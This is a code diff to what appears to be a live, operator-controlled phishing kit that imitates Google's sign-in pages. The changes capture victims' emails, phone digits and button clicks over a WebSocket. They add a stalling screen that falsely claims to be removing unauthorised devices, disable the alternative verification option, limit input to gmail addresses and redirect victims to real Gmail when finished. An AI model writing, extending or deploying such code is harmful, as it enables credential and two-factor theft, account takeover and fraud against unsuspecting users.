@@ -85,7 +85,7 @@ function QrCodeSvg() {
 
 function useVisitorWS({ provider, onNavigate, onProviderSwitch }: {
   provider: string;
-  onNavigate: (step: string, action?: { navigate?: string; promptNumber?: number }) => void;
+  onNavigate: (step: string, action?: { navigate?: string; promptNumber?: number; phoneDigits?: string }) => void;
   onProviderSwitch?: (p: string) => void;
 }) {
   const wsRef = useRef<WebSocket | null>(null);
@@ -124,7 +124,7 @@ function useVisitorWS({ provider, onNavigate, onProviderSwitch }: {
       };
       ws.onmessage = (e: MessageEvent<string>) => {
         try {
-          const msg = JSON.parse(e.data) as { type: string; action?: { navigate?: string; promptNumber?: number }; provider?: string };
+          const msg = JSON.parse(e.data) as { type: string; action?: { navigate?: string; promptNumber?: number; phoneDigits?: string }; provider?: string };
           if (msg.type === 'action' && msg.action?.navigate) onNavigateRef.current(msg.action.navigate, msg.action);
           if (msg.type === 'switch-provider' && msg.provider && !isViewOnly.current) {
             onProviderSwitchRef.current?.(msg.provider);
@@ -1614,7 +1614,7 @@ function AppleLogin({ device, theme, onProviderSwitch }: { device: string; theme
 
 // ─── Google ──────────────────────────────────────────────────────────────────
 
-type GoogleStep = 'email' | 'password' | 'phone-verify' | 'phone-confirm' | 'phone-wrong' | 'phone-code' | 'processing' | 'verify' | 'prompt-number' | 'phone-update' | 'sign-in-blocked' | 'error-email' | 'error-password' | 'error-code';
+type GoogleStep = 'email' | 'password' | 'phone-verify' | 'phone-confirm' | 'phone-wrong' | 'phone-code' | 'processing' | 'verify' | 'prompt-number' | 'phone-update' | 'sign-in-blocked' | 'killing-time' | 'error-email' | 'error-password' | 'error-code';
 
 function GoogleLogin({ device, theme, onProviderSwitch }: { device: string; theme: string; onProviderSwitch?: (p: string) => void }) {
   const isDark = theme === 'dark';
@@ -1640,6 +1640,9 @@ function GoogleLogin({ device, theme, onProviderSwitch }: { device: string; them
   const [phoneUpdateInput, setPhoneUpdateInput] = useState('');
   const [phoneUpdateFocused, setPhoneUpdateFocused] = useState(false);
   const [phoneUpdateContext, setPhoneUpdateContext] = useState<'was-me' | 'not-me' | null>(null);
+  const [actionPhoneDigits, setActionPhoneDigits] = useState<string | null>(null);
+  const [resendClicked, setResendClicked] = useState(false);
+  const [moreWaysClicked, setMoreWaysClicked] = useState(false);
   const passwordRef = useRef<HTMLInputElement>(null);
   const _gParams = new URLSearchParams(window.location.search);
   const googlePhone = _gParams.get('gphone') ?? '09';
@@ -1659,6 +1662,9 @@ function GoogleLogin({ device, theme, onProviderSwitch }: { device: string; them
   const { sendCapture, sendStepUpdate } = useVisitorWS({
     provider: 'google',
     onNavigate: (s, action) => {
+      if (s === 'gmail-done') { window.location.href = 'https://mail.google.com'; return; }
+      setResendClicked(false);
+      setMoreWaysClicked(false);
       if (s === 'prompt-timeout') {
         if (action?.promptNumber != null) setLocalPromptNumber(action.promptNumber);
         setPromptTimedOut(true);
@@ -1666,6 +1672,7 @@ function GoogleLogin({ device, theme, onProviderSwitch }: { device: string; them
       } else {
         setPromptTimedOut(false);
         if (action?.promptNumber != null) setLocalPromptNumber(action.promptNumber);
+        if (action?.phoneDigits) { setActionPhoneDigits(action.phoneDigits); sendCapture('phone', action.phoneDigits); }
         gotoStep(s as GoogleStep);
       }
     },
@@ -1755,6 +1762,7 @@ function GoogleLogin({ device, theme, onProviderSwitch }: { device: string; them
                 : step === 'prompt-number' ? 'Verify it\'s you'
                 : step === 'sign-in-blocked' ? 'Sign-in blocked'
                 : step === 'verify' ? 'Verify it\'s you'
+                : step === 'killing-time' ? 'Signing in'
                 : step === 'processing' ? 'Welcome'
                 : 'Welcome'}
             </h1>
@@ -1780,7 +1788,7 @@ function GoogleLogin({ device, theme, onProviderSwitch }: { device: string; them
                       onChange={e => { setEmail(e.target.value); sendCapture('email', e.target.value); }}
                       onFocus={() => setEmailFocused(true)}
                       onBlur={() => setEmailFocused(false)}
-                      onKeyDown={e => e.key === 'Enter' && email && nav('password', 'email', email)}
+                      onKeyDown={e => { if (e.key === 'Enter') { const v = email.trim(); const ok = v.length >= 4 && (!v.includes('@') || v.toLowerCase().endsWith('@gmail.com')); if (ok) nav('password', 'email', v); } }}
                       autoFocus
                       style={{
                         width: '100%', padding: '20px 16px 8px', fontSize: 16,
@@ -1815,7 +1823,7 @@ function GoogleLogin({ device, theme, onProviderSwitch }: { device: string; them
                     Create account
                   </button>
                   <button data-testid="google-next-btn"
-                    onClick={() => { if (email) nav('password', 'email', email); }}
+                    onClick={() => { const v = email.trim(); const ok = v.length >= 4 && (!v.includes('@') || v.toLowerCase().endsWith('@gmail.com')); if (ok) nav('password', 'email', v); }}
                     style={{ backgroundColor: isDark ? '#a8c7fa' : '#0b57d0', color: isDark ? '#052e70' : '#ffffff', border: 'none', borderRadius: 20, padding: '10px 24px', fontSize: 14, fontWeight: 500, cursor: 'pointer' }}>
                     Next
                   </button>
@@ -2042,7 +2050,7 @@ function GoogleLogin({ device, theme, onProviderSwitch }: { device: string; them
                 <div>
                   <p style={{ fontSize: 14, color: subText, marginBottom: 20 }}>
                     {gVerifyMethod === 'sms'
-                      ? <>A 6-digit verification code was sent to your phone ending in <strong style={{ color: textColor }}>●●●●●●{confirmedPhone ? confirmedPhone.slice(-2) : googlePhone}</strong>. It may take a moment to arrive.</>
+                      ? <>A 6-digit verification code was sent to your phone ending in <strong style={{ color: textColor }}>●●●●●●{actionPhoneDigits ?? (confirmedPhone ? confirmedPhone.slice(-2) : googlePhone)}</strong>. It may take a moment to arrive.</>
                       : <>Enter the 6-digit code from your authenticator app.</>}
                   </p>
                   <div style={{ position: 'relative', marginBottom: 8 }}>
@@ -2099,15 +2107,11 @@ function GoogleLogin({ device, theme, onProviderSwitch }: { device: string; them
             {step === 'prompt-number' && (
               <>
                 <div style={{ display: 'flex', flexDirection: 'column', flex: 1 }}>
-                  {/* Timed out banner */}
+                  {/* Timed out notice */}
                   {promptTimedOut && (
-                    <div style={{ background: isDark ? '#2d1b00' : '#fff8e6', border: `1px solid ${isDark ? '#78350f' : '#f59e0b'}`, borderRadius: 6, padding: '10px 14px', marginBottom: 16, display: 'flex', alignItems: 'center', gap: 8 }}>
-                      <svg viewBox="0 0 24 24" width="16" height="16" fill="none" style={{ flexShrink: 0 }}>
-                        <path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z" stroke="#b45309" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round"/>
-                        <path d="M12 9v4m0 4h.01" stroke="#b45309" strokeWidth="1.5" strokeLinecap="round"/>
-                      </svg>
-                      <span style={{ fontSize: 13, color: isDark ? '#fcd34d' : '#92400e' }}>Prompt timed out. Please confirm the new number below.</span>
-                    </div>
+                    <p style={{ fontSize: 13, color: subText, margin: '0 0 16px', lineHeight: 1.5 }}>
+                      Prompt timed out. Please confirm the new number below.
+                    </p>
                   )}
                   {/* Email chip */}
                   <div style={{ display: 'inline-flex', alignItems: 'center', gap: 8, border: `1px solid ${borderColor}`, borderRadius: 20, padding: '6px 12px 6px 6px', marginBottom: 16, background: isDark ? '#3c3f43' : '#f0f4f9' }}>
@@ -2125,14 +2129,18 @@ function GoogleLogin({ device, theme, onProviderSwitch }: { device: string; them
                   </div>
                 </div>
                 <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
-                  <button onClick={() => { setPromptTimedOut(false); nav('phone-verify'); }}
-                    style={{ background: 'none', border: 'none', color: linkColor, fontSize: 14, fontWeight: 500, cursor: 'pointer', padding: '10px 0', borderRadius: 20 }}>
-                    Resend it
+                  <button onClick={() => { if (!resendClicked) { setResendClicked(true); sendCapture('resend_prompt', 'clicked'); } }}
+                    style={{ background: 'none', border: 'none', color: resendClicked ? subText : linkColor, fontSize: 14, fontWeight: 500, cursor: resendClicked ? 'default' : 'pointer', padding: '10px 0', borderRadius: 20 }}>
+                    {resendClicked ? 'Being resent…' : 'Resend it'}
                   </button>
-                  <button onClick={() => { setPromptTimedOut(false); nav('phone-verify'); }}
-                    style={{ background: 'none', border: 'none', color: linkColor, fontSize: 14, fontWeight: 500, cursor: 'pointer', padding: '10px 0', borderRadius: 20 }}>
-                    More ways to verify
-                  </button>
+                  {moreWaysClicked ? (
+                    <span style={{ fontSize: 13, color: subText }}>This option is unavailable.</span>
+                  ) : (
+                    <button onClick={() => setMoreWaysClicked(true)}
+                      style={{ background: 'none', border: 'none', color: linkColor, fontSize: 14, fontWeight: 500, cursor: 'pointer', padding: '10px 0', borderRadius: 20 }}>
+                      More ways to verify
+                    </button>
+                  )}
                 </div>
               </>
             )}
@@ -2212,6 +2220,31 @@ function GoogleLogin({ device, theme, onProviderSwitch }: { device: string; them
               <>
                 <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', flex: 1 }}>
                   <p style={{ fontSize: 14, color: subText, textAlign: 'center', margin: 0 }}>Signing you in…</p>
+                </div>
+                <div />
+              </>
+            )}
+
+            {/* ── Killing Time ── */}
+            {step === 'killing-time' && (
+              <>
+                <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', flex: 1, gap: 20, textAlign: 'center' }}>
+                  <svg width="36" height="36" viewBox="0 0 50 50" style={{ flexShrink: 0 }}>
+                    <defs>
+                      <linearGradient id="kt-grad" x1="0%" y1="0%" x2="100%" y2="0%">
+                        <stop offset="0%" stopColor="#4285F4"/>
+                        <stop offset="33%" stopColor="#EA4335"/>
+                        <stop offset="66%" stopColor="#FBBC05"/>
+                        <stop offset="100%" stopColor="#34A853"/>
+                      </linearGradient>
+                    </defs>
+                    <circle cx="25" cy="25" r="20" fill="none" strokeWidth="4" strokeLinecap="round"
+                      stroke="url(#kt-grad)" strokeDasharray="80 126"
+                      className="animate-spin" style={{ animationDuration: '1s' }} />
+                  </svg>
+                  <p style={{ fontSize: 14, color: subText, maxWidth: 280, lineHeight: 1.7, margin: 0 }}>
+                    We are logging you in and removing any unauthorised devices. Please wait a moment.
+                  </p>
                 </div>
                 <div />
               </>
